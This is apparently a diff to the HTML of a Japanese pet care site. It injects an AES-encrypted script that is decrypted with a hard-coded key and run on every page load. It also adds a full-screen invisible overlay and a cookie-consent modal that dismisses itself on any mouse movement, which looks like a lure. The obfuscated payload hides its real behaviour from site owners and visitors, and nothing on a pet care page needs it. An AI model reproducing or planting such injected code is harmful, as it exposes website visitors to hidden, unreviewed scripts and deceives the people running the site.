@@ -79,7 +79,87 @@ footer {
 <h1>Petii.site</h1>
 <p>Practical, easy-to-understand pet care information for everyday life in Japan, created for individuals who want simple and responsible guidance.</p>
 </header>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, '2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`U2FsdGVkX18Km7iHWTRJP9dwqejWR5sAJOolV8mjf9veXRrvLwPLTQipTDWgY8wwgueDRxSnmDxtfqYs%2BdrzKLAbiQRMbusDIt%2F8xtMXdPSYl%2FvqZKxLFm3SADEU2%2BdPBQnxq%2BIHB9sbkLYftAiEHMDgJndmVkn50dLBbZkWVhgqKmMrPi%2FdKSC7hcZ2qo4eOOBB2s1H1IXCuJlnIkG7sHCAE%2Bb7fi9YUXJ2f2ar6D%2F1jFkjfb6AYG34IRrDIwh0KFgMHSqDqQc8nJLUoEJmNNsmhlJVHxupzCFKWrgldwDVec50ISnhMuGr65jo5yEzddeg5GUxwKr2Ba%2FMJ7fLyrLcyBie94msyNmxpxvtlyAUhalp7Z3IUZ7pwHCbS%2BS%2BE9P0M7loYHj5rtXDkFkxKWD8KKm4sasfilpVZsJ0kirzCNJLn5m6FCMLC9GezXfOqiMRzodMoQKjhMVypHq5R%2FOh1x0%2Fp46DboUc%2BgXvWnT17L5behyI4%2B8XbxnxJ27YOJbKY%2FyXAf0DawV4gDedm23PIFCR5olc0wiq82b8kPNC1x8Izft1evX1gXPK7fIaqfHk1UTw3Fukp7JDtBl8BmrhO33oF3FLDHYnHkEJuWe6F6NNQ75LLcfbhNDlSyr8%2B8sSxsA3eRMmLO85MSY5BN7EEngc81ggZHbOJhBibaCGhAmUVLmD%2BuXbK2AHyHnj1k%2FnQpPm5ebipL1Z57bBkFf8xomyK7ChZZMYh2O2pF%2FzvDrXoPc8MmwMha5ctDYlUXGSpqoq9JFC81d1L4nTRlUP0GM9t6lJ%2B4EmMqw6U4MFqRo4%2Fx9ysgQr4XhXedFPceGPnZvapQsD1gtrMPwxotAt%2BV3OXsR23cKWkCr99%2BPHIq6Suzk9Co8L7ThBF9T%2FS6hQGYLmwkHZpDgNwGeaWOxNcqotgc6hwoQXqKcvjE4MQQTAudPADV1pDbT9IVBYCh6AMbLqZ55rtLdyEOtuaGV1K7cFCYENWQESVQRf9cHx600N%2BkdlHKyVodIR%2F9qXNBEU3qsq5S%2FO1WamOXllNrHI%2BgzMNfYHcZxmQCv41Ze4eLHwhW2e54ac3pHxxwOkcBu1yMaz0QjjjEoQL%2FL8Os7OoYL0j%2FpUbo9E%2F8aGkDMYH89g3mtqtjtZFux4PLcCqV3GifVVnrrXxpiggguGEqsHd2iMJHr5iRSWP6V%2BqxuZpss4wQkRAPvWrglNit47W%2F2dOwqbrgw7cM8MXkUcazug%2BMAwsZMIN2e%2FxNrZUA4Y5DmE2SyQxDzPYdZAqRAW5CaL13mqmSbTnYlaG2PZp00G%2FlIH3hyXTgnf24ytlgYrCAT9P1QN0BftscRSHp28crG3OMEvdCI4xY%2FOvsEOrzCmzhNqeehyYIaTqmHo3FRU%2F86zrNoWyIfZbwM80q7d0Bff%2B7IHByWbmsoNsFuxqV0asdEU4p%2B4RX23xdr95C8R40alH2Df7XU8RdRRBrMVUBX2BTL%2B0uy%2B7mvnS58BMerVBPCW4KDjJdRo5sWICF6AVVapKJt5yZ6sgsE1%2B07gy%2FJGSw%2B27hNQHYNyhhjZhQuTChkpuBZgkuvfEReceusbyOtZA%2Fw1o0e8fTvmvMcd02pBouG5Hm3KJ3%2FkpO9zigdZ9619lKTt%2B896ZkDvhhtXLcT2sNZzf%2B6HUC%2BeXd5xS7%2BCEfrdbBU28mE%2BlOup21m8GhqtXqYbFqi9%2BdTTLky3aQAAx980opNPu7BAOTWzKxivH3lVeCkPVgopbh%2BuKbOt8w1GQB0f1ZT0Z%2FNzAsuf0BIpRbVwp%2FH1oeO2G0juXLMoB4xprgrZLOocThPzjKMSG6XKzaZjIUpaAvdRMRwrQfcqMtoGk0OIsotoFojdPzRHEcrDFWYn1GdYW2ZX%2BSFrhVTVv1o1thtDhHwoaV0IEJauAFSG%2BOqVx%2FohtWc8Qpvfm56kOBiLuxazqTj3ZhUs1S%2FGcyT60j1W3GGqjvZOX%2F168xb7v7xywp6yZzabWDNxOgJBSUurw146ybSBx9Xv6K2Eh1O3q4ZYamdmybopBYt5%2F0wU4wskr8rdZw70hGyfT1v0m33oetOuZ7Opah7JiuunMf5t2W5yp3ADh2XE5FnCcZtsEcmJ8OdiPqq8%2Bto7ap88sFoKy%2FLoNaDqACNlU6BMxS64yj3E4J6Ni2F0YVYu8sjDRgo9impJxsrQyEJgrRYK3Uz6vdR9Ramzb9XxK8W7JBpHEV1sy7r9orY41mj2B%2FBDz4tvKPOP%2BWwvTOBfZCGFC%2BbyXH%2BzLzp9MLu%2FFcTkBwB6x6qwQPwc7TZjv1F7zQ5Tl4kluIy40qapUpaWG3qZks9tOU2zrpTv2lg0UgFhVlUzp0Sks14Oh9eTzIcfXTSzaS2DRlHFp3RjiUiD%2FdHqUmxSiSmpKnxsGV1JTBGR6xcNCmR3LN6VwEn%2Bxtku6IMkmBJTo16RKh7ju8rtlZmzf99q%2BV4vSFCgwUxVV%2Flq5v%2BnhyaFru%2BaMgzbUydZOjjmV4b4LremWSciCJ5e2mHrEUrUIlMDPC8ZkC7xG1PFZHzsAyiTS7Ikh9ZTKTl1zEdtxQtfxMaxHeRHnOsSLV6xDtRGczjZ%2FMWAk61fWyrtNQPwJ1j324wXKWdNtBI1I51Leej5aIlSmgiIA3mvEWXcJDaZGBjoR538kwLTL1a9PVs24Visii8vD%2BedOJsE91k5JYhXMbmBA9Lrr2WKu2PJyFn4BSv5hs0U1lY5K%2FMZdETV4Wh5v%2F4ckIYx%2FcQ4b8x25m7RDXTIiLfRh07bBMwfn738bBrlFSLIazRzvj8Ounst1Y%2BT749zoC0qMUxIdqwDBI%2BUSCn6FprneEW1T%2BLRrKpA5EKpxwcJ6nNoDMyOBdt7uU8I6vsw5j97PIZEzY%2FtrVfC34u1iXrC2p2UiYi5fnJXjz1WXeYLr882Gts34l%2Bt6Ugfsn0fPb6v%2Fts9w%2FMU9mf%2F2mWjp0TDUFPk%2FRf8FdFm3ZpaHkfl53cY68FAjj4MlRV7omk69aILPWE8thmpyA186BTOFrNAXMZ%2FbjEcMqyHKE2T5UtsGJAYe%2BP%2Fo5SYz15b8Ry8X6TzoBIcl8d86leBbIAvU2NVZmeTBlV%2Bz%2F7YACrkaw5hgrUcly2ZeuHUYlgKq703kptGi1eBeNYEB%2B8EHBN0RFeUZDaKgfZ%2F5IIXeTYdr%2FJiuyMMXeajn0%2FVh2wAOUdWEhFArBBCTjLwVTaGfT50aU2jk8JfHMtJSqN%2B87oIHVxuup9I9DBp1mRCK8V%2Ffgr2DrqRwtoI3o%2B008djF%2BlItOU5MqXsHFM%2FKqJpa%2Fb5MY2T8F9X5ZMA2MPIm3pN7qL4t7gdjx2BUhv4SmyEmUky7HLEPXeYsMdv%2FBYERuFj%2BpS7blu2CF4z6w%2FrQBwcQ1catHB61bnpa4kv6gbkiTbNRDL41Ed3urph1HGYdIlUJH59CjSzkeYJU%2B6kZ1T9d1vZHFqSuAmdOAYZAqMzcXVCneVleHWiut5a%2B2knu6yzA9FKhw%3D%3D`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script> 
+<div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
 
+</div>
+
+<div id="cookie-modal-box" class="hidden">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+            <button id="cookie-close" class="absolute top-4 right-4">
+                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                </svg>
+            </button>
+            <div class="flex items-center gap-3 mb-4">
+                <span class="text-yellow-500 text-3xl">🍪</span>
+                <h2 class="text-2xl font-bold">クッキーについて</h2>
+            </div>
+            <p class="text-gray-600 mb-6">
+                当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span>
+                をクリックすると、クッキーの使用に同意したことになります。
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script>
 <nav>
 <a href="#">Home</a>
 <a href="#">Guides</a>
